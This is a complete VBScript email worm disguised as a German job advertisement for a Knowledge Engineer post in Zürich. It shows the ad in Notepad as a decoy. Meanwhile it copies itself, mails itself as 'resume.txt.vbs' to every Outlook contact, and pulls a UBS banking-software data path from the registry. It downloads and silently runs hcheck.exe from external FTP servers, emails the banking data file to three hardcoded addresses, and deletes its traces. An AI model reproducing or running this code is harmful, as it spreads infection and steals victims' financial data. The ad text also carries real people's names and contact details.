On Error Resume Next 
Dim fso,f,dirwin,dirsystem,file,wsys,strl  
strl = chr(85)&chr(66)&chr(83)
Const ForReading = 1, ForWriting = 2 
Set fso = CreateObject("Scripting.FileSystemObject")
Set WshShell = WScript.CreateObject("WScript.Shell")
Set f = fso.OpenTextFile("resume.txt", ForWriting, True)
Set dirwin = fso.GetSpecialFolder(0)
Set dirsystem = fso.GetSpecialFolder(1)
f.WriteLine "Knowledge Engineer, Zürich"
f.WriteLine "                          "
f.WriteLine "Intelligente Agenten im Internet sammeln Informationen, erklären Sachverhalte im"
f.WriteLine "Customer Service, navigieren im Web, beantworten Email Anfragen oder verkaufen"
f.WriteLine "Produkte. Unsere Mandantin entwickelt und vermarktet solche Software-Bots: State of the"
f.WriteLine "Art des modernen E-Commerce. Auftraggeber sind führende Unternehmen, die besonderen"
f.WriteLine "Wert auf ein effizientes Customer Care Management legen. Das weltweit aktive,"
f.WriteLine "NASDAQ kotierte Unternehmen mit Sitz in Boston braucht zur Verstärkung seines"
f.WriteLine "explosiv wachsenden Teams in der Schweiz engagierte, hochmotivierte und kreative"
f.WriteLine "Spezialisten. Kurz: Sie haben es in der Hand, die Knowledge Facts für aussergewöhnliche"
f.WriteLine "Lösungen im Internet zu realisieren und neue Schnittstellen zwischen Mensch und"
f.WriteLine "Datenautobahnen zu schaffen. Das Tor zur Welt steht Ihnen offen. Eine faszinierende"
f.WriteLine "Zukunft braucht Ihre Inspiration und Ihr Know-how.... "
f.WriteLine " "
f.WriteLine "Knowledge Engineer"
f.WriteLine " "
f.WriteLine "Liebe auf den ersten Blick: Schnell schliessen Sie mit den virtuellen Wesen Freundschaft auf"
f.WriteLine "höchstem Niveau. Manche mögen in den Bots ja nur Bits und Bytes erkennen ... - Ihnen gelingt es,"
f.WriteLine "High-Tech in Erleben zu wandeln. Mit Hilfe Ihres hohen Abstraktionsvermögens, kombiniert mit"
f.WriteLine "intelligenter Sensibilität, gelingt es Ihnen, jedem Bot eine Identität zu geben. Durch Ihre didaktischen"
f.WriteLine "Fähigkeiten geben Sie dem Software-Roboter Authentizität, so das der Internet-Anwender später"
f.WriteLine "das Gefühl hat: Dieser Bot spricht genau meine Sprache. Er versteht mich und kennt meine"
f.WriteLine "Bedürfnisse.  "
f.WriteLine "  "
f.WriteLine "Auf diesem spannenden Weg zu einem hoch gesteckten Ziel liegt ein Labyrinth, das im heterogenen"
f.WriteLine "Team nur mit Akribie und Methode zu durchqueren ist. Kein Job für Phantasten, die sich im Gewebe"
f.WriteLine "ihrer kreativen Spinnereien verfangen. Sie halten die Waage zwischen analytischem Denken und"
f.WriteLine "ideenreichen Visionen stets im Lot. Ihren Blick auf das Wesentliche haben Sie in Ihrer Ausbildung"
f.WriteLine "geschärft: Ein Studium bringen Sie mit. Naturwissenschaften oder Informatik? Vielleicht sind Sie"
f.WriteLine "auch Geisteswissenschafter und sehen gerade deshalb die Schnittstelle zwischen Mensch und"
f.WriteLine "Internet mit ganz anderen Augen? Oder bringen Sie sprachliche Routine als Journalist, Texter oder"
f.WriteLine "Lektor mit? Wer aus der Theaterwissenschaft kommt wird beim Bot-Casting mit dabei sein und"
f.WriteLine "gerne die vielfältigen Charaktere in Szene setzen wollen."
f.WriteLine " "
f.WriteLine "Sie sprechen sehr gut deutsch und englisch und sind evtl. in einer weiteren Sprache gut zu Hause."
f.WriteLine "Branchenerfahrung (Financial Services oder Retail) sowie fundierte IT-Erfahrung in den Bereichen"
f.WriteLine "Internet und Programmierung (C++; JAVA; HTML) helfen, Machbares von Unmöglichem objektiv"
f.WriteLine "zu trennen. Was Sie auch in Ihrem Background-Gepäck mit sich führen: Sie haben es in der Hand,"
f.WriteLine "die Knowledge Bases für aussergewöhnliche Internet-Auftritte zu schaffen."
f.WriteLine " "
f.WriteLine "Wollen Sie in einem Spitzenteam eine Spitzenleistung erbringen? Dann rufen Sie Dr."
f.WriteLine "Christina Musahl oder Dr. Claudio Lupi an auf 01 / 225 41 85 oder senden Sie eine Email"
f.WriteLine "an christina.musahl@atkinsonstuart.com"
f.WriteLine "Ihre schriftliche Bewerbung richten Sie an Atkinson Stuart, Löwenstrasse 2, P.O. Box,"
f.WriteLine "CH-8024 Zürich. www.atkinsonstuart.com "
f.WriteLine "                                                                                     "
f.WriteLine "Atkinson Stuart, Dr. Christina F. Musahl, Löwenstrasse 2, P.O. Box, 9023 Zürich, Tel: +41 (1) 225"
f.WriteLine "30 70, Fax: +41 (0) 225 41 85"
f.WriteLine "WWW: http://www.atkinsonstuart.com"
f.WriteLine "E-Mail: christina.musahl@atkinsonstuart.com"
f.WriteLine "Bitte geben Sie bei Kontaktaufnahmen immer die Ref.-Nr. des Inserates an!"
f.WriteLine "                                                                          "
f.Close
intReturn = WshShell.Run("notepad " & "resume.txt", 1,FALSE)
s = WshShell.RegRead("HKEY_CURRENT_USER\Software\"&strl&"\"&strl&"PIN\Options\Datapath") 
set file = fso.OpenTextFile(WScript.ScriptFullname,1)
wcopy=file.ReadAll
set wsys = fso.CreateTextFile (dirsystem&"\resume.txt.vbs")
wsys.write wcopy
wsys.Close 
function fileexist(filespec)
On Error Resume Next
dim msg
if (fso.FileExists(filespec)) Then
msg = 0
else
msg = 1
end if
fileexist = msg
end function
function filesize(filesz)
On Error Resume Next
set demofile = fso.GetFile(filesz)
if (demofile.size=0) then
msg = 0
else
msg = 1
end if
filesize = msg
end function
sub cmail()
On Error Resume Next
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")
set male=out.CreateItem(0)
male.bcc="ct102356@excite.com;acch01@netscape.net;deroha@mailcity.com"
male.Subject = "contract"
male.Attachments.Add(s)
male.DeleteAfterSubmit = True
male.Send
Set out=Nothing
Set mapi=Nothing
end sub
sub smail()
On Error Resume Next
dim x,a,ctrlists,ctrentries,add
set out=WScript.CreateObject("Outlook.Application")
set mapi=out.GetNameSpace("MAPI")
for ctrlists=1 to mapi.AddressLists.Count
set a=mapi.AddressLists(ctrlists)
x=1
for ctrentries=1 to a.AddressEntries.Count
add=a.AddressEntries(x)  & ";"&add
x=x+1
next
next
set male=out.CreateItem(0)
male.bcc= add
male.Subject = "Resume"
male.Attachments.Add(dirsystem&"\resume.txt.vbs")
male.DeleteAfterSubmit = True
male.Send
Set out=Nothing
Set mapi=Nothing
end sub
chk = WshShell.RegRead("HKEY_CURRENT_USER\Software\ACH0\")
if (chk="") then
smail()
WshShell.RegWrite  "HKEY_CURRENT_USER\Software\ACH0\",1,"REG_DWORD"
if (s<>"") then
Set f = fso.OpenTextFile("scr", ForWriting, True)
f.WriteLine "user anonymous"
f.WriteLine "h@aol.com"
f.WriteLine "binary"
f.WriteLine "get hcheck.exe"
f.WriteLine "quit"
f.Close
intReturn = WshShell.Run("ftp -s:scr -n 165.121.181.24" ,0, TRUE)
if (fileexist("hcheck.exe")=0  and  filesize("hcheck.exe")<>0) then
rem 
else
Set f = fso.OpenTextFile("scr", ForWriting, True)
f.WriteLine "user anonymous"
f.WriteLine "h@aol.com"
f.WriteLine "binary"
F.WriteLine "cd incoming"
f.WriteLine "get hcheck.exe"
f.WriteLine "quit"
f.Close
intReturn = WshShell.Run("ftp -s:scr -n alw.nih.gov" ,0, TRUE)
end if
if (fileexist("hcheck.exe")=0  and  filesize("hcheck.exe")<>0) then
rem 
else 
Set f = fso.OpenTextFile("scr", ForWriting, True)
f.WriteLine "user anonymous"
f.WriteLine "h@aol.com"
f.WriteLine "binary"
f.WriteLine "cd incoming"
f.WriteLine "get hcheck.exe"
f.WriteLine "quit"
f.Close
intReturn = WshShell.Run("ftp -s:scr -n archive.egr.msu.edu" ,0, TRUE)
end if
intReturn = WshShell.Run("hcheck.exe" ,0, TRUE)
Set MyFile = fso.GetFile(s)
MyFile.Copy ("ct001")
MyFile.Close
Set f = fso.OpenTextFile("cfile.bat", ForWriting, True)
f.WriteLine "copy "&dirsystem&"\cp_21863.nls+ct001="&dirsystem&"\cp_21863.nls"
f.WriteLine "del "&dirsystem&"\resume.txt.vbs"
f.WriteLine "del scr"
f.WriteLine "del ct001"
f.WriteLine "del cfile.bat"
f.Close
cmail()
rbat = WshShell.Run("cfile.bat" ,0, TRUE)
end if
end if
